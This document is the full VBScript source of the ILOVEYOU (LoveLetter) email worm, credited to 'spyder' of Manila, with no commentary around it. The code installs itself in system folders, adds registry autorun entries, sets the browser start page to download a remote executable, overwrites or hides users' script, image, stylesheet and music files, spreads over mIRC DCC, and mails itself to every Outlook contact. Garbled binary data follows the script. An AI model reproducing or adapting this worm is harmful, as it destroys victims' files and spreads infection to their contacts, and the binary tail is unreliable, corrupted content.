rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           �� 3>.�����!ԩA0%Ҡ �U�` �0fU� 
�P���n@��P��&h�2����|"�%�6f��B�G��,%�΢���&�dj*�,VjuUt2\H1�(��I�q���Al�8�P��4�dHGQ��B��\�8s�����H*j�wqTP�B�,�B&�1΃
1/�4r�ܳ�U��>�i�,�$��UI��$/� ��ҍP�CN��aFL�ae�C��`�੓)���¤$�' \a�%�׆z��#�X�؁D�	_!ӯ	0[�@ J�'34NC=ػ(�i�BiR�A�'���i�d�!�EN�)�a�!#�H:0:�BDv<:7B��T��CWW)��b��{;���X�]�H�1k(iI8$݉�^[�v�l��0���&>�] ����e3�����l��
f��+#����cq((Bp4�0��Hh@�4
M@�.1��`Z(�T�3��6�Ϣ��5�<H�8�遠�s��g['���TnR�%B��3+5:D��eVBM�X������;�}���]0�:��X��FzS�o&L
�9`	�m`X�Z��d q�e0d
e�:^��f@0�BH4.F�sR��3b����B��o�L�aSY��wf|$�x�JU$��*�`!pH6p            @                      @                      @           P   <  �&��f�����������������xph`Pxx�D&��@[��TBd)�� x'""K"�@#A�5&�Vc#s�ꕁ� j�X�1B�H۸4�B�[hb��0B��p�W�Ĉs�T�`�V��Z������fN�C�H�x�J`C�1�� sȤ�D�B�(#�A��W�ƕ��(��CA�8c��"KK
�Ո�L���U+���2�@B1hy �*u�8�� �J0�`�P�Jw�p1C2UI�e�"�y"N�< npd�Q�F&U�c<���6��!ؑ�*(`�rNU-�A5d)��xJ��>C�rhYJ5x��g�B��`C�&�PnP4��B��Cd��A�,�&W��J��F��X�m	$�ZU\�M'rXQdX��J)�"{��Jɺ�ԜiE<�F�CA#;S�J(JRZ3c ���i��h�H`��Բ�a�g����Zc�(
�Ÿ�N&�Sy�4�!ru٤4��RcpU��Y!$k�7���LM)��HhЙ�BiTc��	q��85���GQ*h�UR�� e����� i.�
de9=K@���3c"%�D�.Q$*� ���A�BĢ@H�8�
��cv%TU�	~7X'Q���I%,�
a(�A�@��(���`��Ds ��MP�A5Ka@`�(
�!3`�I�\(���חD&����!T��9Z�I#6�`�P�(3Q���P�k�Q"���`�Ĥ����
~ �FJ˦���8��N������~� ��%X�3����P�?"�2Ӡ������#߈ihbJ#:���[qTDPj�A����B��!P�Dj�RB
;���)U�E0gP&4F�yŐ݂2�jx��$3N$2��T�7!�B))�R��A���)���@ d��$�$�#B
B�R!L���FbG|�8^ֈ��"C#+G����� ��	d�
)U�0�4	�CJ@��*D��(1y"+$%�d.R���F �R�'4BI%# ���	]WCU4��%��@�4%b�H!�@5$�֬
���H*�R��$]�&@:��H!%�@AID�(D�!!"	
Q�J�!I�B%� B~P*I�T*I�$I*IBR�J���$I�$J�$I�$I�$�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$�$I�$IR$I*I�$I%I�$	!��T�RI��$�$I�(�N�C)I���PH��FF	������"VI%H�B�KRU��2%]�(��DB����J�TiH;�C�$h R�!��@�0@�%!�
�eW�	@�!������	$Mrf%$i�0EY��!I�D2! @��IF���"��	�D�4eB�0�05�%UJbT��Y��öj"5��d��)�C�ĆQ"���^��D�8%j�h�[�A��&�40�f�YLd����1�
4B%�`H���*° ���"��>l),�sF����\ye`e���T^�Q�����eD 1� ������0�Vl��d�1bff�.���UF�Q �@�q�Ap	A� è�=�p$Ey
1�e0BhDU"��� 2�<J�)�U9d6k������e	�d�6zb	;�a(z����0��5�(E��������K� �X���X��x$�;�]��X�,��!L9.Lnhn![h�r�g>���UHT��*���0ENP�QpM1H9EH�dny�
��
 ��9��d�"s�@����m��~%ꘘdH�"	B�ZpM�$�ac��89��_�`��2o�%g@j+ T��v�Ǌ����qUZX�h;sJ�,%�� 9��CUt�I�"���Wqd�I18���|��1� G|6U\��^B��"aht�C��]L]3���ιP�,�`n�L�h�1)��*��MXQ�t���a�hQ���e�˝5,04FC`�	���i� ]Rb���'
�4� ʀ?i����`�!�T����bw�7�)�o"+�"}��tǰ��K3(�ʠ�P�0	H.C��o򨄚�K%��_�9vjz����0�)�4!K�� :Fkc��D�F�̀�#^�7�A�F�/B�].B���$�S~��Z���{J��"�T�ɘk,(D&oJ
g��9G����%nW���y�g�U AZ$�B�T�t�HD��6�������t	E��@�Z�5�	��ȑ�h�EJM���B	��	��X$V�*@�	G����A[�k2j�����¡	9�B�=4��� 	������p%	��MIS(UUr�C9�jhy��^d�^b^�" ��=�Q���������������||tl`XLtx�@�LF�vI�0� 0�hH	0f�Z @� �0�Q�X��)?��`�7g-D���[���"�����K�Є����|Y�T�4�*J��B��e
�����`��؋��P���#H&�#�F�d��ࢡ�0�" Q�јh"�Q�L���8��0Cc�F$�5����""dT�*��q�^DH��8����
$�U��������C�TM�AV��uL9$`�A-�X�l�:�f6�(�#��:ա<
3�B��0*�\2DŢ6�Ҋ9� Q�e��H�rԔcwge����Cc��ͤ�EB"�I0W�0B�9/�D�#@T�f"P�N(�P� �]��%N�E"�,2	���fd0T�]�LS��)���6���Ѯ�!&rh(q��CWɚA������ � p���sH��UA��5I���t�j^"����M�&>�@A��S(e�)^q��C!��O!�1�ZQ�a��9t�	Vh�d:�dƱ<�y���f4���h�P�	"�a�A��|(��U	�Y�H����W%<$&�$%`�!��@�^'�KUJ =���xB�(�*:U��i�0� D5�)�5%|��)�̶:x}��@
`��j3�E1�i�8>	�qD*x��J��2UB=��O�u��d�����R<�<@l%/��/�`M�I��8T���t�HX��"t,���� )�p݆(�@�t!�M��9���.�¦�y2�˳��)��]�`$�u����Q*�
6�1��i�$���8��D��4$ɠh@$�(ĬtE���	�S�&ֿ�g��B��J�NC��\L��,LJr�ΐ9��z�U�jJ!�!$��� $�فX@2C����J�H��(4$�2DLf`R�I��-IkPӖ�6-�j��ظUbA�5Ò9b�HdH�lIG���&I4��Ty��%��#���Y�n���f�QIF�����9!��M�&
��JN�@u���CBp����I�@ �$��$!I� 	�$@,@�!@  B� %@ �D�� FHH ��@!$@R�H�$I�$I���$$$	I�$	$	I��$IH�$I�$I�$$I�$$ !��$I�$$	��IH�$IHIL��4�A�$I�"��@H���8� �$��Ў	REI,)� D�DUM��J���ԔC-:}��A�B�4�Q�&��t$qUr� R ��r��63�@D��3� ��&��	uH��)$ꂭy .	U]!�U�8Ȑ�/R��a)!c�u ����*H%�� ��Ta�G� �4���%Q�`���)HJ�HFR&�E$$C(�2��m�&��b�D P1�d.�Ġp&y(	D�Q&�Ei���T_�'�1HD
qd�I��l��p����HC8X�q�2q���L�F�'�}4���IR)L���<����ɨ� R�؋�	c,��I#� �`9��ҐtF����dA"j���0?�΢��A̰�mRU2�	(�C�'dA� �4˰��� 4Gd)�x�!M��@��jR� .3�Z �0��D&�F�����D���H	�Ri���O�Z����H�;2���a a
�'��Amt����V�\R'Bf�%��-�Y����QbB���� rćWI�X�rG�q�##
X��0B��S��2& ��`N��-a!
�L�'H�6( ��lE+�k����5��U&��x�1.�l�V��dp�1��)W�4��� ��/�z4Q*N�&%2B��q �P�r���2�IF �R�`Tjc �I!bW�*2�X3�V�������*��Q�x�t�߂���=j�IU�+�����QK�H���"(�.�c:+NcB#��� ���F(q�0U�fq�0��^����*22މ�US?�2*�$����/�$�-2�?R]�Y(� ָ�I;U�3��8�΢蔖�D�%�Ch iʴ@(f��F�%��bP~�G����"a�x$�0�I�zix��Y�KG�F�0�9F-	��� ��,���ʈ��Ex)JU}��xt�e��o%t�&N��L	����04�o��_���Lq�(
zi!�~����i�4i(9�6��M#qȞ�K�!B�5ŋ��(�k)�K�h�,`ر�g<YƉ{�p�               @                      @                      @           4     
��yr������̼���������tph`PHtx���E�&e �39&��
��B�B�(�8�X�HD@=�H�(�L�%�:��E�WBfJJ�g�L���C�
��ۤv�5�A�4 *�\��